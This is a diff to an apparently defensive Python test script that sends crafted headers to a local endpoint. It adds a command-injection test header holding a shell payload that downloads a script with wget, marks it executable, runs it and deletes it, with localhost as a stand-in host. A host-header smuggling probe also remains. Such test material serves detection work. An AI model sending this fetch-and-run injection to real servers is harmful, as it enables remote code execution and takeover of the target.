@@ -7,9 +7,10 @@ url = 'http://localhost:5000/test/get/headers'
 
 headers = {
     'User-Agent': 'test',
-    'Proxy-Connection': 'keep-alive', #Proxy header detection
-    'proxy-authorization': 'test',
+    #'Proxy-Connection': 'keep-alive', #Proxy header detection
+    #'proxy-authorization': 'test',
     'host': 'localhost:80', #request smuggling
+    'X-Command-Injection-Test': '"http://localhost`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://localhost:8080/a/wget.sh;chmod 777 wget.sh;sh wget.sh localhost;rm -rf wget.sh`"',
 }
 
 if __name__ == '__main__':
